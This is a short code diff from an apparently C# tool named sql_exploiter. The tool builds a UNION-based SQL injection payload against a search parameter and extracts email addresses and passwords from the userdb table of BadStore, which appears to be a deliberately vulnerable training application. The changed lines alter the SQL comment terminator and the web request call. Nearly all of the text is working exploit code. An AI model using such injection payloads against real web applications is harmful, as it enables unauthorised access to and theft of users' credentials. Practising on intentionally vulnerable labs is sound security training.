@@ -22,11 +22,11 @@ namespace sql_exploiter
             string payload = "test' UNION ALL SELECT";
             payload += " NULL, NULL, NULL, CONCAT(0x" + frontHex + ", IFNULL(CAST(email AS";
             payload += " CHAR), 0x20),0x" + middleHex + ", IFNULL(CAST(passwd AS";
-            payload += " CHAR), 0x20), 0x" + endHex + ") FROM badstoredb.userdb# ";
+            payload += " CHAR), 0x20), 0x" + endHex + ") FROM badstoredb.userdb-- ";
 
             url += "?searchquery=" + Uri.EscapeUriString(payload) + "&action=search";
 
-            HttpWebRequest request = (HttpWebRequest)WebRequest.CreateHttp(url);
+            HttpWebRequest request = (HttpWebRequest)WebRequest.Create (url);
             string response = string.Empty;
             using (StreamReader reader = new StreamReader(request.GetResponse().GetResponseStream()))
                 response = reader.ReadToEnd();
